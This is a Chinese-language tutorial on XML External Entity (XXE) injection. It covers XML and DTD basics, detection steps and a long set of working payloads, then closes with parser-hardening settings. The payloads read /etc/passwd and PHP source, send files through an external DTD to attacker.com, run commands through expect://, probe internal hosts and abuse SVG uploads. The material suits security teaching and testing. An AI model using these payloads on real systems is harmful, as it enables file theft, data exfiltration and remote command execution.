# XML External Entity (XXE)

> **参考：** [SSTI](../Server-Side%20Template%20Injection%20(SSTI)/Server-Side%20Template%20Injection%20(SSTI).md) | [PHP Deserialization](../PHP%20Deserialization/PHP%20Deserialization.md)

---

## 什么是 XXE？

XML 外部实体注入（XML External Entity Injection，简称 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它使攻击者能够查看应用程序服务器上的文件，并与应用程序本身可访问的任何后端或外部系统进行交互。

XXE 漏洞的核心在于：**XML 解析器在处理外部实体声明时，会按照指定的 URI 去获取资源，并将内容嵌入到 XML 文档中。如果解析器配置不当，攻击者可以借此读取本地文件、探测内网端口、发起 SSRF 攻击，甚至在特定条件下执行系统命令。**

---

## XML 基础

### 什么是 XML？

XML（Extensible Markup Language）是一种通用的结构化数据存储与交换格式，用于在不同系统之间标准化传输和存储信息。

**XML 与 HTML 的关键区别：**

| 特性 | XML | HTML |
|------|-----|------|
| 标签 | 自定义，无预定义标签 | 固定标签（如 `<h1>`、`<div>`） |
| 大小写 | 区分大小写 | 不区分大小写 |
| 属性值 | 必须加引号（`id="1"`） | 引号可选（`id=1` 也有效） |
| 标签闭合 | 必须闭合（包括自闭合 `<br/>`） | 允许单标签（如 `<br>`） |
| 用途 | 传输和存储数据 | 展示数据，渲染页面 |

### XML 基础语法

```xml
<?xml version="1.0" encoding="utf-8" ?>
<root id="root-node">
    <msg>Hello World</msg>
    <msg>Foo Bar</msg>
</root>
```

基本规则：
- 必须有且只有一个自定义的根节点，包含所有子标签
- 标签成对出现，区分大小写
- 属性值必须加引号

---

## DTD 基础

### 什么是 DTD？

DTD（Document Type Definition）是用于定义 XML 文档结构和合法元素的语法规则。它可以看作是 XML 文档的"蓝图"或 schema。DTD 可以内嵌在 XML 文档内部（内部 DTD），也可以作为外部文件被引用（外部 DTD）。

DTD 的关键功能是允许声明**实体（Entity）**，实体可以理解为可在 XML 中引用的变量或宏。

### DTD 示例

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
    <!-- 元素声明 -->
    <!ELEMENT note (to, from, heading, body)>
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT heading (#PCDATA)>
    <!ELEMENT body (#PCDATA)>

    <!-- 内部实体声明 -->
    <!ENTITY signature "Best Regards">

    <!-- 外部实体声明 -->
    <!ENTITY logo SYSTEM "image/company_logo.png">
]>
<note>
    <to>Alice</to>
    <from>Bob</from>
    <heading>Meeting Reminder</heading>
    <body>
        Please attend the meeting at 2pm tomorrow.
        &signature;
    </body>
</note>
```

### 元素内容类型

| 类型 | 含义 | 示例 |
|------|------|------|
| `(#PCDATA)` | 纯文本内容 | `<!ELEMENT name (#PCDATA)>` |
| `EMPTY` | 空元素 | `<!ELEMENT br EMPTY>` |
| `ANY` | 任何内容（不推荐） | `<!ELEMENT container ANY>` |
| `(子元素...)` | 元素只能包含子元素 | `<!ELEMENT person (name, age)>` |
| 混合内容 | 文本与子元素混合 | `<!ELEMENT p (#PCDATA \| em \| strong)*>` |

---

## XML 实体（Entity）

### 字符实体

XML 中的预定义字符实体，用于表示在 XML/HTML 中有特殊含义的字符：

| 字符 | 描述 | 命名字符实体 | 数字实体 |
|------|------|------------|---------|
| `<` | 小于号 | `&lt;` | `&#60;` |
| `>` | 大于号 | `&gt;` | `&#62;` |
| `&` | 和号 | `&amp;` | `&#38;` |
| `"` | 双引号 | `&quot;` | `&#34;` |
| `'` | 单引号 | `&apos;` | `&#39;` |

### 命名实体（内部实体）

在 DTD 内部定义，XML 文档中通过 `&实体名;` 引用：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
    <!ELEMENT foo (#PCDATA)>
    <!ENTITY hello "world">
]>
<foo>&hello;</foo>
<!-- 解析结果：<foo>world</foo> -->
```

### 外部实体

引用外部文件或 URL 的内容：

```xml
<!ENTITY 实体名称 SYSTEM "外部文件URI">
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
    <!ENTITY externalData SYSTEM "data.txt">
]>
<note>
    <content>&externalData;</content>
</note>
<!-- 解析结果：data.txt 的内容被嵌入到 <content> 中 -->
```

### 参数实体

**核心特征：** 仅在 DTD 内部使用，以百分号 `%` 开头。

```xml
<!-- 定义 -->
<!ENTITY % 实体名称 "实体内容">

<!-- 引用 -->
%实体名称;
```

**示例 -- 外部参数实体（XXE 攻击的关键）：**

`modules.dtd`（外部 DTD 文件）：

```xml
<!ENTITY % person_content "(name, birthdate?, address?, email*)">
<!ENTITY % contact_attrs "phone CDATA #IMPLIED mobile CDATA #IMPLIED">
```

`main.xml`（主 XML 文件）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE database [
    <!ENTITY % external_modules SYSTEM "modules.dtd">
    %external_modules;
    <!-- 之后可以使用 %person_content; 和 %contact_attrs; -->
]>
```

**参数实体与一般实体的区别：**

| 特性 | 一般实体 | 参数实体 |
|------|--------|---------|
| 定义符号 | `<!ENTITY name "value">` | `<!ENTITY % name "value">` |
| 引用符号 | `&name;` | `%name;` |
| 使用范围 | XML 文档任何位置 | 仅在 DTD 内部 |
| 主要用途 | 在 XML 中嵌入数据 | 构造和组织 DTD |

---

## XXE 漏洞检测

### 第 1 步：寻找 XML 处理入口点

- **明显的 XML 格式：** 查找接受 `application/xml`、`text/xml` 或 SOAP 的请求
- **文件上传：** 应用可能处理 XML 格式文件（如 `.docx`、`.xlsx`、SVG 图像等，这些本质上是 XML 文件）
- **Content-Type 修改：** 尝试将 `Content-Type` 改为 `application/xml`，但发送 JSON 或其他格式数据，观察服务器是否仍尝试解析
- **表单数据转换：** 在普通 POST 请求中尝试将数据格式改为 XML

### 第 2 步：检测 XML 解析器是否工作

**发送一个格式正确的 XML：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<test>value</test>
```

**触发解析错误：** 发送格式错误的 XML（如不闭合标签），观察是否返回 XML 解析错误信息：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<test><value>
```

### 第 3 步：测试实体是否可用

发送包含内部实体的 XML，观察实体是否被解析：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
    <!ENTITY hello "world">
]>
<foo>&hello;</foo>
```

如果响应中 `&hello;` 被替换为 `world`，说明实体被解析，存在 XXE 的可能性极高。

### 第 4 步：带外验证（OOB）

使用外部实体触发带外请求，这是确认盲 XXE 最有效的方法：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://your-server.com/xxe-test">
]>
<foo>&xxe;</foo>
```

在攻击者服务器上监听 HTTP 请求。如果收到来自目标服务器的请求，说明 XXE 漏洞存在。

**使用参数实体进行 DNS 探测：**

```xml
<!ENTITY xxe SYSTEM "http://subdomain.your-server.com">
```

检查 DNS 日志是否收到对应的查询。

---

## XXE 利用技术

### 任意文件读取

最基础的利用方式，通过 `file://` 协议读取本地文件：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- Windows 系统 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<foo>&xxe;</foo>
```

**PHP 伪协议读取（编码绕过限制）：**

对于 PHP 文件（直接读取会被解析执行而无法看到源码），使用 Base64 编码绕过：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">
]>
<foo>&xxe;</foo>
```

对响应中的 Base64 字符串解码即可获取源码。

### 带外数据泄露（OOB / Blind XXE）

当直接回显不可用，需要通过外带方式获取数据。核心思路是让服务器分两步加载：先加载攻击者控制的外部 DTD，DTD 再指示服务器将敏感数据发送到攻击者服务器。

**攻击者服务器上的 DTD 文件 (`evil.dtd`)：**

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % init "<!ENTITY &#37; send SYSTEM 'http://attacker.com:7777/?p=%file;'>">
```

> **注意：** `&#37;` 是 `%` 的 HTML 实体编码。在外部 DTD 中嵌套定义参数实体时，`%` 必须写成 `&#37;` 才能被浏览器正确解析而不被视为新的参数实体声明。

**发送给目标的 Payload：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
    %remote;
    %init;
    %send;
]>
<foo>placeholder</foo>
```

**执行过程解析：**

```
%remote 加载外部 DTD
    -> 下载 http://attacker.com/evil.dtd 到本地 DTD 中

%init 调用 init 参数实体
    -> 声明新的参数实体 %send

%send 调用 send 参数实体
    -> 向 http://attacker.com:7777/?p=<base64编码的文件内容> 发起请求
```

攻击者在 `7777` 端口监听，收到的 GET 请求 URL 中即包含编码后的目标文件内容。

**通过 DNS 外带（绕过防火墙限制）：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
    <!ENTITY % dtd "<!ENTITY % exfil SYSTEM 'http://%file;.your-dns-server.com/'>">
    %dtd;
    %exfil;
]>
<foo>placeholder</foo>
```

### SSRF 攻击（内网探测）

利用 XXE 探测内网主机和端口：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://192.168.1.1:80">
]>
<foo>&xxe;</foo>
```

通过修改 IP 和端口，根据响应时间或错误信息差异判断内网主机存活和服务开放情况。

**通过 SSRF 对内网服务进行命令注入：**

如果发现内网主机存在命令注入漏洞，可通过 XXE 进行串联攻击：

```xml
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "http://10.1.2.3?cmd=ls">
]>
```

### `expect://` 协议命令执行

`expect://` 是 PHP 的一个包装器，允许直接执行系统命令。这是 XXE 攻击中最危险的利用方式之一。

**前提条件：**
- PHP 环境
- 已安装并启用 `expect` 扩展（通常需要 `php-expect` 包）

**基本 Payload：**

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY cmd SYSTEM "expect://whoami">
]>
<data>&cmd;</data>
```

**执行复杂命令：**

```xml
<!ENTITY cmd SYSTEM "expect://id">
<!ENTITY cmd SYSTEM "expect://cat /etc/passwd">
<!ENTITY cmd SYSTEM "expect://ls -la /">
```

**命令中的空格绕过（使用 `$IFS`）：**

```xml
<!ENTITY test SYSTEM "expect://cat$IFS/etc/passwd">
```

**常见特殊字符限制与解决方案：**

| 字符 | 问题 | 解决方案 |
|------|------|---------|
| `;` | 命令分隔 | 用 `sh -c` 包装 |
| `|` | 管道 | 用 `sh -c` 包装 |
| `>` `<` | 重定向 | 用 `sh -c` 包装 |
| `"` `'` | 引号 | 正确转义 |
| `$` | 变量扩展 | 使用 `\$` 转义 |
| 空格 | 参数分隔 | 使用 `$IFS` 或引号包裹 |

**使用 `sh -c` 包装复杂命令：**

```xml
<!ENTITY cmd SYSTEM "expect://sh -c 'ls -la | grep test && echo done'">
```

**使用 Base64 编码执行：**

```xml
<!ENTITY cmd SYSTEM "expect://echo 'bHMgLWxhIHwgZ3JlcCB0ZXN0' | base64 -d | sh">
```

### XInclude 攻击

当无法控制整个 XML 文档但可以控制插入 XML 文档中的数据时，XInclude 可以作为一种替代攻击方式。它在 XML 标准中用于包含外部内容。

**基本语法：**

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="header.xml"/>
</root>
```

**用于文件读取的 XXE Payload：**

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="/etc/passwd" parse="text"/>
</root>
```

- `xmlns:xi` 声明 XInclude 命名空间（必需）
- `href` 指定要包含的文件路径
- `parse="text"` 以纯文本方式读取，避免 XML 解析错误

### SVG 文件上传 XXE

SVG 是基于 XML 的矢量图像格式。当应用允许上传 SVG 文件并解析时，可以在 SVG 中嵌入 XXE payload：

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="500px" height="100px"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     version="1.1">
    <text font-family="Verdana" font-size="16" x="10" y="40">
        &xxe;
    </text>
</svg>
```

上传后查看 SVG 图片，文件内容将作为图片上的文字显示。

> **注意：** `<?xml version="1.0" standalone="yes"?>` 和 SVG 命名空间声明是必需的，否则 SVG 解析器可能不会处理 DTD。

---

## 实战技巧

### XML 提交格式注意事项

- 提交 XML 到 POST body 时，尽量不要换行和缩进（某些解析器对换行敏感）
- 将 `Content-Type` 设置为 `application/xml` 或 `text/xml`
- 如果原始格式不是 XML（如 JSON、表单），尝试修改 `Content-Type` 并发送 XML 数据

### PHP 环境下的特殊技巧

在 PHP 环境下，`file://` 协议和 `php://filter` 伪协议通常可用：

```xml
<!-- 直接文件读取 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- PHP 伪协议 Base64 编码读取 -->
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">

<!-- 读取远程页面源码（通过 php://filter 包装 URL） -->
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://target/page.php">
```

### 无回显场景的外带方案

如果目标服务器无法直接发起 HTTP 外带请求（被防火墙阻止），可尝试：
- **DNS 外带：** 将敏感数据拼接到子域名中，通过 DNS 查询传递
- **FTP 外带：** 使用 `ftp://` 协议替代 `http://`
- **Burp Collaborator：** 使用 Burp Suite 内置的 Collaborator 客户端进行 DNS/HTTP 外带探测

---

## 防御方案

1. **禁用外部实体解析：** 这是最有效的方法。不同 XML 解析库的配置方式不同：

   PHP（libxml）：
   ```php
   libxml_disable_entity_loader(true);
   ```

   Python（lxml）：
   ```python
   parser = etree.XMLParser(resolve_entities=False)
   ```

   Java：
   ```java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

2. **输入验证与过滤：** 对用户提交的 XML 内容进行白名单验证，拒绝包含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM` 等 DTD 声明的内容

3. **使用更安全的数据格式：** 如果可以，使用 JSON 替代 XML 作为数据交换格式

4. **禁用不需要的 PHP 包装器：** 在 `php.ini` 中限制可用的流包装器

5. **网络层防护：** 配置防火墙规则，限制服务器向外部发起不必要的网络连接

6. **升级和补丁：** 保持 XML 解析库和相关依赖的最新版本
